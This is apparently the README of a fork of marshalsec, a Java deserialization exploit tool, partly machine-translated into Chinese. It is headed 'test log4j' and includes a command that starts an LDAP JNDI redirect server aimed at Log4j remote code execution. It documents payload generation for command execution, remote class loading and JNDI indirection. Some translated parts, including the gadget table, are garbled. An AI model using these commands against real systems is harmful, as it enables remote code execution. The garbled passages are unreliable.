# test log4j
![2L(N)YB)}@E%DNTXQG7J22X](https://user-images.githubusercontent.com/37278360/145526150-5b05157d-5be7-47ff-a9d5-b7713e7a9520.png)

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  "http:127.0.0.1:8888/#Log4j
RCE"

# Java Unmarshaller Security - 将数据转化为代码执行

## Paper

自从 Chris Frohoff 和 Garbriel Lawrence 展示他们对 Java 对象反序列化漏洞的研究以来，已经两年多了，最终导致了 Java 历史上最大的远程代码执行错误浪潮。
对此事的研究表明，这些漏洞不仅限于像 Java 序列化或 XStream 这样具有表现力的机制，但有些漏洞也可能适用于其他机制。
本文介绍了各种 Java 开源编组库的分析，包括利用细节，这些库允许（编辑）对任意的、攻击者提供的类型进行解组，并表明无论该过程如何执行以及存在哪些隐式约束易于使用类似的开发技术。
Full paper is at [marshalsec.html](marshalsec.html)

## 免责声明

所有信息和代码仅用于教育目的和/或测试您自己的系统是否存在这些漏洞。
## Usage

需要 Java 8。使用 maven ```mvn clean package -DskipTests``` 构建。运行方式
```shell
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
```

where

* **-a** - 为该编组器生成测试所有有效载荷.
* **-t** - 在测试模式下运行，在生成它们之后解组生成的有效载荷。
* **-v** - 详细模式，例如还显示了在测试模式下生成的有效载荷。
* **gadget_type** - 特定小工具的标识符，如果省略将显示该特定编组器的可用小工具。
* **arguments** - 小工具特定参数

包括以下编组器的有效载荷生成器：<br>
|马歇尔 |小工具影响 | ------------------------------- | ---------------------------------------------- | BlazeDSAMF(0&124;3&124;X) | JDK 仅升级为 Java 序列化<br>各种第三方库 RCE |粗麻布&124;粗麻布|各种第三方RCE |脚轮 |依赖库RCE |杰克逊 |可能只有 JDK 的 RCE，各种第三方 RCE |爪哇|又一个第三方RCE | JsonIO |仅 JDK RCE | JYAML |仅 JDK RCE |克里奥 |第三方RCE | KryoAltStrategy |仅 JDK RCE | Red5AMF(0&124;3) |仅 JDK RCE | SnakeYAML |仅 JDK RCE | XStream |仅 JDK RCE | YAMLBeans |第三方RCE

## 参数和其他先决条件

### 系统命令执行
* **cmd** - 要执行的命令
* **args...** - 作为参数传递的附加参数

没有先决条件。
### 远程类加载（普通）

* **codebase** - 远程代码库的 URL
* **class** - 要加载的类

**先决条件**:

* 在某个路径下设置托管 Java 类路径的网络服务器。
* 要加载的编译类文件需要根据 Java 类路径约定提供服务。

### 远程类加载（ServiceLoader）

* **服务代码库** - 远程代码库的 URL

要加载的服务当前硬编码为 javax.script.ScriptEngineFactory。

**先决条件**:

* 与普通的远程类加载相同。
* 还需要 <codebase>META-INFjavax.script.ScriptEngineFactory 中的提供程序配置文件，其中包含纯文本形式的目标类名称。
* Target class specified there needs to implement the service interface *javax.script.ScriptEngineFactory*.


### JNDI Reference indirection

* **jndiUrl** - JNDI URL to trigger lookup on


**Prerequisites**:

* Set up a remote codebase, same as remote classloading.
* Run a JNDI reference redirector service pointing to that codebase -
  two implementations are included: *marshalsec.jndi.LDAPRefServer* and *RMIRefServer*.

      ```java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]```

* Use (ldap|rmi)://*host*:*port*/obj as the *jndiUrl*, pointing to that service's listening address.

## Running tests

There are a couple of system properties that control the arguments when running tests (through maven or when using **-a**)

* **exploit.codebase**, defaults to *http://localhost:8080/*
* **exploit.codebaseClass**, defaults to *Exploit*
* **exploit.jndiUrl**, defaults to *ldap://localhost:1389/obj*
* **exploit.exec**, defaults to */usr/bin/gedit*

Tests run with a SecurityManager installed that checks for system command execution as well as code executing from remote codebases.
For that to work the loaded class in use must trigger some security manager check.



